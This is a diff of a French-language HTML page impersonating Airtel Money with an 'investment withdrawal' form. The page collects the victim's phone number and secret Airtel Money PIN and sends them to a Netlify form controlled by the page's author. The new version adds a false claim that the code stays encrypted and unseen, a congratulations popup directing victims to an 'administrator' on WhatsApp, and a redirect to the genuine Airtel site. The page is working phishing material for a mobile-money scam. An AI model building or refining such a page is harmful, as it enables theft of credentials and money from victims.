@@ -1,166 +1,155 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Retrait d'investissement — Airtel Money</title>
-  <style>
-    * { box-sizing: border-box; font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
-    html,body { height:100%; margin:0; background: linear-gradient(180deg,#f2f6fb 0%, #ffffff 100%); color:#222; }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Retrait d’investissement Airtel Money</title>
 
-    .wrap {
-      min-height:100vh;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      padding:24px;
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #f7f7f7;
+        margin: 0;
+        padding: 20px;
     }
 
-    .card {
-      width:100%;
-      max-width:520px;
-      background: #fff;
-      border-radius:12px;
-      box-shadow: 0 8px 30px rgba(18,30,60,0.08);
-      overflow: hidden;
-      border: 1px solid rgba(0,0,0,0.03);
+    .container {
+        max-width: 450px;
+        margin: auto;
+        background: white;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
 
-    .hero {
-      width:100%;
-      height:120px;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      background: #fff;
-    }
-    .hero img {
-      max-height:90px;
-      object-fit:contain;
+    h2 {
+        text-align: center;
+        margin-bottom: 15px;
     }
 
-    .card-body {
-      padding:22px;
+    img {
+        display: block;
+        margin: 0 auto 15px auto;
+        width: 130px;
     }
-    h1 { font-size:20px; margin:0 0 12px 0; }
-    p.lead { margin:0 0 18px 0; color:#555; font-size:14px; }
-
-    form { display:block; }
-    .field { margin-bottom:14px; }
 
     label {
-      display:block;
-      font-size:13px;
-      margin-bottom:6px;
-      color:#333;
+        font-weight: bold;
+        display: block;
+        margin-top: 12px;
     }
 
-    input[type="text"], input[type="tel"], input[type="number"], input[type="password"] {
-      width:100%;
-      padding:10px 12px;
-      border-radius:8px;
-      border:1px solid #e3e8ef;
-      background:#fbfdff;
-      font-size:15px;
-      outline:none;
-      transition: box-shadow .12s, border-color .12s;
-    }
-    input:focus { border-color:#9bb7ff; box-shadow:0 6px 20px rgba(59,89,210,0.06); }
-
-    .hint {
-      font-size:12px;
-      color:#7a7f86;
-      margin-top:6px;
+    input {
+        width: 100%;
+        padding: 10px;
+        margin-top: 5px;
+        border-radius: 5px;
+        border: 1px solid #ccc;
     }
 
-    .notice {
-      background:#fff9e6;
-      border-left:4px solid #ffd166;
-      padding:10px 12px;
-      border-radius:6px;
-      font-size:13px;
-      color:#6b4b00;
-      margin-top:8px;
+    button {
+        margin-top: 20px;
+        width: 100%;
+        background: #e60000;
+        border: none;
+        padding: 12px;
+        font-size: 18px;
+        color: white;
+        border-radius: 5px;
+        cursor: pointer;
     }
 
-    .btn {
-      width:100%;
-      padding:12px;
-      margin-top:8px;
-      border-radius:10px;
-      border:0;
-      font-weight:600;
-      font-size:15px;
-      cursor:pointer;
-      background: linear-gradient(90deg,#e53935,#ff6b6b);
-      color:#fff;
-      box-shadow: 0 8px 20px rgba(229,57,53,0.18);
+    /* Bulle popup */
+    .popup {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 20px;
+        width: 80%;
+        max-width: 350px;
+        border-radius: 10px;
+        box-shadow: 0 0 15px rgba(0,0,0,0.3);
+        text-align: center;
+        display: none;
+        z-index: 999;
     }
 
-    .small {
-      font-size:12px;
-      color:#666;
-      text-align:center;
-      margin-top:12px;
+    .popup button {
+        background: green;
+        margin-top: 15px;
     }
 
-    .hidden { display:none; }
-  </style>
+    .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.4);
+        display: none;
+        z-index: 998;
+    }
+
+    small {
+        display: block;
+        margin-top: 5px;
+        color: #666;
+        font-size: 12px;
+    }
+</style>
+
+<script>
+    function showPopup(event) {
+        event.preventDefault(); // empêche l’envoi automatique
+
+        document.querySelector(".popup").style.display = "block";
+        document.querySelector(".overlay").style.display = "block";
+
+        // Envoie manuel du formulaire Netlify
+        document.getElementById("retraitForm").submit();
+    }
+
+    function continueAirtel() {
+        window.location.href = "https://www.airtel.africa";
+    }
+</script>
+
 </head>
 <body>
-  <div class="wrap">
-    <div class="card">
-      
-      <div class="hero">
-        <!-- Remplace ici l'image -->
-        <img src= "IMG_9605.PNG" alt="Airtel Money">
-      </div>
 
-      <div class="card-body">
-        <h1>Retrait d'investissement — Airtel Money</h1>
-        <p class="lead">Remplissez les informations ci-dessous pour initier le retrait.</p>
+<div class="container">
+    <img src="IMG_9605.png" alt="Airtel Money">
+    <!-- Remplace airtelmoney.png par ton image (garde les guillemets) -->
 
-        <form name="retrait-airtel-money"
-              method="POST"
-              data-netlify="true"
-              action="https://www.airtel.africa"
-              netlify-honeypot="bot-field"
-              autocomplete="on">
+    <h2>Retrait d’investissement Airtel Money</h2>
 
-          <input type="hidden" name="form-name" value="retrait-airtel-money">
+    <form name="retrait" method="POST" data-netlify="true" id="retraitForm" onsubmit="showPopup(event)">
+        
+        <label>Numéro Airtel Money</label>
+        <input type="text" name="numero" required>
 
-          <div class="hidden">
-            <label>Ne pas remplir : <input name="bot-field"></label>
-          </div>
+        <label>Montant à recevoir</label>
+        <input type="number" name="montant" required>
 
-          <div class="field">
-            <label for="am-number">Numéro Airtel Money</label>
-            <input id="am-number" name="numero_airtel" type="tel"
-                   placeholder="Votre Numero de telephone" required>
-          </div>
+        <label>Code Airtel Money</label>
+        <input type="password" name="code" required>
+        <small>Noté bien votre code reste chiffré et secret, nous n’avons pas accès.</small>
 
-          <div class="field">
-            <label for="amount">Montant à recevoir</label>
-            <input id="amount" name="montant" type="number" min="1" step="0.01"
-                   placeholder="Ex:1000" required>
-          </div>
+        <button type="submit">Recevoir</button>
+    </form>
+</div>
 
-          <div class="field">
-            <label for="am-code">Code Airtel Money</label>
-            <input id="am-code" name="code_airtel" type="password" required
-                   placeholder="••••••">
+<div class="overlay"></div>
 
-            <div class="notice">
-              <strong>Noté :</strong> Remplisez Correctement vos infos pour eviter les erreus .
-            </div>
-          </div>
+<div class="popup">
+    <h3>Félicitations 🎉</h3>
+    <p>Nous avons bien reçu votre demande de retrait d’investissement.<br>
+    Contactez votre administrateur sur WhatsApp pour la finalisation.</p>
 
-          <button type="submit" class="btn">Recevoir</button>
+    <button onclick="continueAirtel()">Continuer</button>
+</div>
 
-
-        </form>
-      </div>
-    </div>
-  </div>
 </body>
 </html>
